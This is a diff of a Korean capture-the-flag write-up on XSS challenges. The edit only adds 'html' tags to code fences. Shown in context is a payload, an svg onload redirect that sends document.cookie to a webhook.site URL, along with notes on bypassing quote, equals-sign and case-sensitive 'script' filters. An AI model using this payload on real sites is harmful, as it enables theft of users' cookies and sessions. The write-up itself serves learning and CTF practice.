@@ -32,7 +32,7 @@ flag는 서버 내의 브라우저 cookie 값에 있기 때문에
 
 이 문제는 `'`, `"`, `=`를 필터링하고 있고, 이 필터링을 우회하여 redirect 시키기 위해 작성한 exploit을 Base64 인코딩하여 Solve 하였습니다.
 
-```
+```html
 <svg/onload=location.href=`https://webhook.site/webhook-id?flag=`.concat(document.cookie)>
 
 to base64(URL-safe) + JS Decoding Code
@@ -113,7 +113,7 @@ xss-1.3과 똑같지만 다른 필터링이 나왔습니다.
 
 파이썬은 대소문자를 구분하기 때문에 기존 `script`에서 `SCRIPT`로 수정하여 Solve 하였습니다.
 
-```
+```html
 <svg/onload=location.href=`https://webhook.site/webhook-id?flag=`.concat(document.cookie)>
 
 to base64(URL-safe) + JS Decoding Code
